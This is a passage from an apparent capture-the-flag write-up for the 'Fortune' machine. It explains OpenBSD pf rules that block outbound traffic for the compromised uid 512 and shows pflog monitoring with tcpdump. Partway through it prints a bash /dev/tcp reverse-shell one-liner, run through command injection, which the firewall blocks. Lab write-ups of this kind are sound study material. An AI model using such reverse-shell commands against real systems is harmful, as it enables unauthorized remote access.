block return out log proto tcp all user = 67
block return out log proto tcp all user = 512
block return out log proto tcp all user = 513
block return out log proto udp all user = 55
block return out log proto udp all user = 67
block return out log proto udp all user = 512
block return out log proto udp all user = 513
anchor "authpf/*" all

```

There’s an implicit `block return all` at the stop, which will be the default should no other rules match.

But beyond the implicit block, the lines `block return out log proto tcp all user = 512` and `block return out log proto tcp all user = 512` is what was stopping me. I’ll break that down:
- `block return` - reject the packet, sending a TCP RST packet (as opposed to `block drop`, which doesn’t send the reset)
- `out` - the direction of the packet, in this case outbound
- `log` - log the packet
- `proto tcp` and `proto udp`- the protocol to be blocked, in this case, both between the two rules
- `all` - all traffic
- `user = 512` - this rule applies to traffic from the identified user

If I remember back to my command injection, I was uid 512:

```

fortune> id
uid=512(_fortune) gid=512(_fortune) groups=512(_fortune)

```

### Logging

I hoped that I could see my attempts in the log file, which should be `/var/log/pflog`. I couldn’t get the file to grow beyond 24 bytes:

```

fortune# ls -l /var/log/pflog
-rw-------  1 root  wheel  24 Nov  4  2018 /var/log/pflog

```

`pf` logs are stored in tcpdump format, and thus are viewed with `tcpdump`. But nothing interesting comes out of this file:

```

fortune# tcpdump -n -e -ttt -r /var/log/pflog host 10.10.14.10
tcpdump: WARNING: snaplen raised from 116 to 160

```

An alternative to the log file is to read logs off the pflog0 interface to monitor in real time. I started `tcpdump`:

```

fortune# tcpdump -n -e -ttt -i pflog0
tcpdump: WARNING: snaplen raised from 116 to 160
tcpdump: listening on pflog0, link-type PFLOG

```

Then I ran a reverse shell via command injection:

```

fortune> bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'
bash: connect: No route to host
bash: /dev/tcp/10.10.14.10/443: No route to host

```

A line did appear in the `tcpdump` window:

```

Jul 29 18:31:10.351547 rule 10/(match) block out on em0: 10.10.10.127.22208 > 10.10.14.10.443: S 1233573000:1233573000(0) win 16384 <mss 1460,nop,nop,sackOK,nop,wscale 6,nop,nop,timestamp 1275021369[|tcp]> (DF) 

```